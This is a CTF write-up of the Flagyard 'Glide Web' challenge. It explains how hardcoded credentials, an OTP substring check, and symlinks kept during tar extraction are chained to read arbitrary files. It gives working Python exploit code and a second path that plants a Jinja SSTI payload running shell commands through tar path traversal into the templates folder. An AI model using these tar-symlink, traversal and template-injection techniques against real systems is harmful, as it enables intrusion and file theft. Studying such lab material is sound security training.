# Glide Web - Flagyard CTF
**Difficulty: Medium**

## Challenge Overview
This challenge presents a web application with a file upload functionality that can be exploited to achieve arbitrary file read on the server through a chain of vulnerabilities including authentication bypass, OTP bypass, and a path traversal through symlink exploitation.

## Technical Details

### 1. Initial Analysis
The application consists of several key components:
- A login system with OTP verification
- A file upload functionality that accepts tar archives
- An extraction mechanism that processes uploaded archives
- A file serving endpoint for accessing uploaded files

### 2. Vulnerability Chain

#### 2.1 Authentication Bypass
The first layer of security uses hardcoded credentials:
```python
if username == 'admin' and password == 'admin':
    session['username'] = username
    return redirect(url_for('otp'))
```
This is trivially bypassed using `admin:admin` credentials.

#### 2.2 OTP Bypass
The OTP implementation contains a critical logic flaw:
```python
if request.method == 'POST':
    otp,_otp = generate_otp(),request.form['otp']
    if otp in _otp:
        session['otp_validated'] = True
```

The vulnerability lies in the comparison `otp in _otp`. Instead of checking for an exact match, it checks if the generated OTP is a substring of the provided OTP. This allows us to bypass by sending all possible 4-digit combinations (0000-9999) as a single string.

#### 2.3 File Upload and Path Traversal
The core vulnerability exists in the file extraction process:
```python
@app.route('/extract')
def extract():
    file_path = session['file_path']
    output_dir = 'uploads'
    if not tarfile.is_tarfile(file_path):
        os.remove(file_path)
        return render_template('extract.html', message='The uploaded file is not a valid tar archive')

    with tarfile.open(file_path, 'r') as tar_ref:
        tar_ref.extractall(output_dir)
```

Key vulnerabilities:
1. No symlink validation in `tar_ref.extractall()`
2. Extracted files are accessible via `/uploads/<filename>`
3. `send_from_directory` follows symlinks when serving files

## Exploitation

### Step 1: Authentication
```python
def bypass_otp():
    S.post(url+"/login", data={"username": "admin", "password": "admin"})
    S.get(url+"/otp")
    S.post(url+"/otp", data={"otp": get_otp()})
```

### Step 2: OTP Bypass
Generate all possible 4-digit combinations:
```python
def get_otp():
    wholedigits = ""
    wordlist = "./4-digit.txt"
    with open(wordlist) as f:
        digits = f.readlines()
    for d in digits:
        wholedigits += d.strip()
    return wholedigits
```

### Step 3: Arbitrary File Read
The exploit creates a symbolic link to the target file and packages it in a tar archive:
```python
def create_symlink_and_tar(filename, link_name="link.file", tar_name="random.tar"):
    os.symlink(filename, link_name)
    with tarfile.open(tar_name, "w") as tar:
        tar.add(link_name)
```

When the tar file is extracted on the server, the symlink is preserved, allowing us to read any file by accessing `/uploads/link.file`.

## Full Exploit
```python
def main():
    bypass_otp()
    while True:
        user_input = input("read file: ")
        link_name = "link.file"+str(random.randint(0,100))
        tar_name = "random"+str(random.randint(0,100))+".tar"
        full_path,link_name = create_symlink_and_tar(user_input, link_name, tar_name)
        S.post(url+"/", files={"file": open(full_path, "rb")})
        print(S.get(f"{url}/uploads/{link_name}").text)
```
## Another way Through SSTI
There was also another way to get flag which was through SSTI injection in a html file set it in the template dir
```python
# Create a directory for the malicious payload
os.makedirs("malicious_payload", exist_ok=True)
# Define the malicious HTML file and its content
malicious_file = "malicious_payload/extract.html"
html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>You've been exploited!</h1>
    <p>{{7*7}}</p>
    <textarea type="text" rows="40" cols="50" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('cat $(find / -name flag.txt 2>/dev/null)').read()}}</textarea>
</body>
</html>
"""
with open(malicious_file, "w") as f:
    f.write(html_content)
# Define the target path for traversal (e.g., ../../extract.html)
# Adjust the number of "../" to match the directory depth on the server.
traversal_path = "../templates/extract.html"
with tarfile.open("file.tar.gz", "w:gz") as tar:
    tar.add(malicious_file, arcname=traversal_path)
print("[+] Malicious tar.gz file 'file.tar.gz' created successfully with extract.html content.")
```
## Conclusion
This challenge demonstrates how multiple seemingly minor vulnerabilities can be chained together to achieve arbitrary file read on a system. It emphasizes the importance of proper input validation, secure file handling, and robust authentication mechanisms in web applications.

The exploitation chain:
1. login with admin:admin
2. Bypass OTP by sending all possible combinations in one line
3. Create a symlink to target file
4. Package symlink in tar
5. Upload and extract to read arbitrary files

